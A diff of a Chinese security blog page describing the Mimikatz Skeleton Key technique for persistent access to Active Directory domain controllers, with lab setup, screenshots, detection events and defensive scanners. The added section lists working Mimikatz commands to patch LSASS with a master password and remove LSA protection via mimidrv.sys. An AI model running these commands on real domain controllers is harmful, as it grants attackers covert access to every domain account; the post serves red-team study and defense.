@@ -20,20 +20,29 @@
     var CONFIG = {"hostname":"swanq.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="0x00前言如上上篇博客所介绍两种利用SSP进行域控权限维持的方法，都需要域控重启才可生效。本篇利用skeleton key则是立即生效，skeleton key可作为金票的替代品。 0x01 简介 在64位域控服务器上使用，因为skeleton key被安装在64位DC上 只是让所有域用户使用同一个万能密码进行登录其目前用户可以用原密码进行登录 但重启后失效  在DC上以高权限（域管理员）运行s">
+  <meta name="description" content="0x00前言如上上篇博客所介绍两种利用SSP进行域控权限维持的方法，都需要域控重启才可生效。本篇利用skeleton key则是立即生效，skeleton key可作为金票的替代品。 0x01 简介 在64位域控服务器上使用，因为skeleton key被安装在64位DC上 只是让所有域用户使用同一个万能密码进行登录其目前用户可以用原密码进行登录 但重启后失效  mimikatz万能密码实现原理在">
 <meta property="og:type" content="article">
 <meta property="og:title" content="域渗透维权之Skeleton Key">
 <meta property="og:url" content="http://swanq.top/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/index.html">
 <meta property="og:site_name" content="SwanQ&#39;s Blue SKY">
-<meta property="og:description" content="0x00前言如上上篇博客所介绍两种利用SSP进行域控权限维持的方法，都需要域控重启才可生效。本篇利用skeleton key则是立即生效，skeleton key可作为金票的替代品。 0x01 简介 在64位域控服务器上使用，因为skeleton key被安装在64位DC上 只是让所有域用户使用同一个万能密码进行登录其目前用户可以用原密码进行登录 但重启后失效  在DC上以高权限（域管理员）运行s">
+<meta property="og:description" content="0x00前言如上上篇博客所介绍两种利用SSP进行域控权限维持的方法，都需要域控重启才可生效。本篇利用skeleton key则是立即生效，skeleton key可作为金票的替代品。 0x01 简介 在64位域控服务器上使用，因为skeleton key被安装在64位DC上 只是让所有域用户使用同一个万能密码进行登录其目前用户可以用原密码进行登录 但重启后失效  mimikatz万能密码实现原理在">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://swanq.top/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/0.png">
+<meta property="og:image" content="http://swanq.top/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/1.png">
+<meta property="og:image" content="http://swanq.top/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/2.png">
+<meta property="og:image" content="http://swanq.top/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/3.png">
+<meta property="og:image" content="http://swanq.top/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/4.png">
+<meta property="og:image" content="http://swanq.top/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/5.png">
+<meta property="og:image" content="http://swanq.top/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/6.png">
+<meta property="og:image" content="http://swanq.top/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/7.png">
 <meta property="article:published_time" content="2021-07-14T02:19:55.000Z">
-<meta property="article:modified_time" content="2021-07-14T03:19:42.001Z">
+<meta property="article:modified_time" content="2021-07-14T13:41:39.500Z">
 <meta property="article:author" content="swanQ">
 <meta property="article:tag" content="渗透测试">
 <meta property="article:tag" content="skeleton key">
 <meta property="article:tag" content="域控权限">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://swanq.top/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/0.png">
 
 <link rel="canonical" href="http://swanq.top/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/">
 
@@ -188,7 +197,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2021-07-14 10:19:55 / 修改时间：11:19:42" itemprop="dateCreated datePublished" datetime="2021-07-14T10:19:55+08:00">2021-07-14</time>
+              <time title="创建时间：2021-07-14 10:19:55 / 修改时间：21:41:39" itemprop="dateCreated datePublished" datetime="2021-07-14T10:19:55+08:00">2021-07-14</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -205,7 +214,7 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
               </span>
-              <span>545</span>
+              <span>1.6k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -229,10 +238,8 @@
 <li><strong>只是让所有域用户使用同一个万能密码进行登录</strong>其目前用户可以用原密码进行登录</li>
 <li>但重启后失效</li>
 </ul>
-<p>在DC上以高权限（域管理员）运行skeleton，能够将Kerberos加密降为RC4_HMAC_MD5，并给LSASS进程patch一个主密码：Mimikatz。这个密码可以用来作为任何用户访问域中的任何主机。域内用户的登录活动将不会受到影响，因为他们的密码将继续正常工作。</p>
-<h2 id="mimikatz万能密码实现原理："><a href="#mimikatz万能密码实现原理：" class="headerlink" title="mimikatz万能密码实现原理："></a>mimikatz万能密码实现原理：</h2><p>在DC上以域控权限运行skeleton,能够将Kerberos认证加密降到RC4_HMAC_MD5，并以内存更新的方式给lsass.exe进程patch一个主密码mimikatz。</p>
-<h1 id="0x02-测试："><a href="#0x02-测试：" class="headerlink" title="0x02 测试："></a>0x02 测试：</h1><p>测试环境：</p>
-<table>
+<h2 id="mimikatz万能密码实现原理"><a href="#mimikatz万能密码实现原理" class="headerlink" title="mimikatz万能密码实现原理"></a>mimikatz万能密码实现原理</h2><p>在DC上以域控权限运行skeleton,能够将Kerberos认证加密降到RC4_HMAC_MD5，并以内存更新的方式给lsass.exe进程patch一个主密码mimikatz。</p>
+<h1 id="0x02-测试"><a href="#0x02-测试" class="headerlink" title="0x02 测试"></a>0x02 测试</h1><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a><strong>测试环境</strong></h3><table>
 <thead>
 <tr>
 <th align="center">IP</th>
@@ -251,16 +258,40 @@
 <td>windows 10(x64)</td>
 </tr>
 </tbody></table>
-<p><strong>原理：</strong></p>
-<p><strong>功能：</strong></p>
-<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><ul>
-<li></li>
+<h3 id="攻击测试"><a href="#攻击测试" class="headerlink" title="攻击测试"></a>攻击测试</h3><p>1.在DC上以域控权限运行skeleton key,将Kerberos的认证加密降到RC4_HMAC_MD5，并以内存更新的方式给lsass.exe进程patch密码mimikatz。但是为什么要这么做还是得把所有攻击复现完成之后看看mimikatz的源码，这个工程量一定巨大</p>
+<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/0.png"></p>
+<p>此处借用后续绕过PPL的图，先提到debug权限，然后patch密码</p>
+<p>2.域内用户利用skeleton key登录域控</p>
+<p>域控使用密码mimikatz进行net use连接</p>
+<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/1.png"></p>
+<p>域管账户登录域控</p>
+<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/2.png"></p>
+<p>普通账户登录域控时可以发现根本没有权限.可以证明只有patch了密码的域管账号才可以查看DC的目录。</p>
+<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/3.png"></p>
+<h3 id="LSA保护"><a href="#LSA保护" class="headerlink" title="LSA保护"></a>LSA保护</h3><p>为了防止对lsass.exe的代码注入，微软在14年添加了LSA保护策略，便无法使用mimikatz对lsass.exe进行注入。当然需要我们配置一下注册表</p>
+<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/4.png"></p>
+<p>重启系统</p>
+<p>试试mimikatz直接patch万能密码，发现不可行<br><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/5.png"></p>
+<h3 id="绕过LSA"><a href="#绕过LSA" class="headerlink" title="绕过LSA"></a>绕过LSA</h3><p>当然对于LSA protection，mimikatz也是有办法绕过的.必须驱动文件：mimidrv.sys。导入驱动文件后，绕过LSA保护</p>
+<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/6.png"></p>
+<p>直接用域管账号测试：</p>
+<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/7.png"></p>
+<h3 id="命令集合："><a href="#命令集合：" class="headerlink" title="命令集合："></a><strong>命令集合：</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 清除net use连接</span><br><span class="line">net use * &#x2F;del &#x2F;y</span><br><span class="line"># 用户名密码建立net use共享资源连接</span><br><span class="line">net use \\域控主机全名  mimikatz &#x2F;user:用户名</span><br><span class="line"></span><br><span class="line"># mimikatz patch密码</span><br><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br><span class="line"># 绕过LSA protection</span><br><span class="line">privilege::debug</span><br><span class="line">!+</span><br><span class="line">!processprotect &#x2F;process:lsass.exe &#x2F;remove</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x04-检测"><a href="#0x04-检测" class="headerlink" title="0x04 检测"></a>0x04 检测</h1><ul>
+<li>日志4697：记录mimidrv.sys驱动的安装事件</li>
+<li>sysmon日志13：mimidrv服务及对应的驱动程序</li>
+<li>sysmon日志6：驱动被加载且未签名</li>
 </ul>
-<h1 id="0x05-检测及清理"><a href="#0x05-检测及清理" class="headerlink" title="0x05 检测及清理"></a>0x05 检测及清理</h1><h2 id="1-检测"><a href="#1-检测" class="headerlink" title="1.检测"></a>1.检测</h2><ul>
-<li></li>
+<h1 id="0x05-防御"><a href="#0x05-防御" class="headerlink" title="0x05 防御"></a>0x05 防御</h1><ul>
+<li>zBang扫描子项：Skeleton Key scan - 发现可能被 Skeleton Key 恶意感染的域控</li>
+<li>SkeletonKeyScanner脚本扫描，主要通过文件名 Yara规则 已知恶意与非恶意文件的哈希 进程等进行检测：<a target="_blank" rel="noopener" href="https://github.com/Neo23x0/SkeletonKeyScanner">https://github.com/Neo23x0/SkeletonKeyScanner</a></li>
 </ul>
-<h2 id="2-防御清除："><a href="#2-防御清除：" class="headerlink" title="2.防御清除："></a>2.防御清除：</h2><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
-<li></li>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>红队可以用Skeleton Key可在不需要破解任何域用户密码的情况下访问域内主机和网络资源。唯一的缺陷是当DC重启后，将不起作用。</p>
+<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
+<li><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Skeleton%20Key.html">https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Skeleton%20Key.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml">https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml</a></li>
+<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2018/04/10/skeleton-key/">https://pentestlab.blog/2018/04/10/skeleton-key/</a></li>
 </ol>
 
     </div>
@@ -369,7 +400,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">0x01 简介</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mimikatz%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">mimikatz万能密码实现原理：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-%E6%B5%8B%E8%AF%95%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">0x02 测试：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">0x04 总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-%E6%A3%80%E6%B5%8B%E5%8F%8A%E6%B8%85%E7%90%86"><span class="nav-number">5.</span> <span class="nav-text">0x05 检测及清理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%A3%80%E6%B5%8B"><span class="nav-number">5.1.</span> <span class="nav-text">1.检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E9%98%B2%E5%BE%A1%E6%B8%85%E9%99%A4%EF%BC%9A"><span class="nav-number">5.2.</span> <span class="nav-text">2.防御清除：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="nav-number">6.</span> <span class="nav-text">参考：</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">0x01 简介</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mimikatz%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86"><span class="nav-number">2.1.</span> <span class="nav-text">mimikatz万能密码实现原理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-%E6%B5%8B%E8%AF%95"><span class="nav-number">3.</span> <span class="nav-text">0x02 测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="nav-number">3.0.1.</span> <span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95"><span class="nav-number">3.0.2.</span> <span class="nav-text">攻击测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LSA%E4%BF%9D%E6%8A%A4"><span class="nav-number">3.0.3.</span> <span class="nav-text">LSA保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87LSA"><span class="nav-number">3.0.4.</span> <span class="nav-text">绕过LSA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88%EF%BC%9A"><span class="nav-number">3.0.5.</span> <span class="nav-text">命令集合：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-%E6%A3%80%E6%B5%8B"><span class="nav-number">4.</span> <span class="nav-text">0x04 检测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-%E9%98%B2%E5%BE%A1"><span class="nav-number">5.</span> <span class="nav-text">0x05 防御</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="nav-number">7.</span> <span class="nav-text">参考：</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -442,12 +473,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">81k</span>
+    <span title="站点总字数">82k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:14</span>
+    <span title="站点阅读时长">1:15</span>
 </div>
 
         
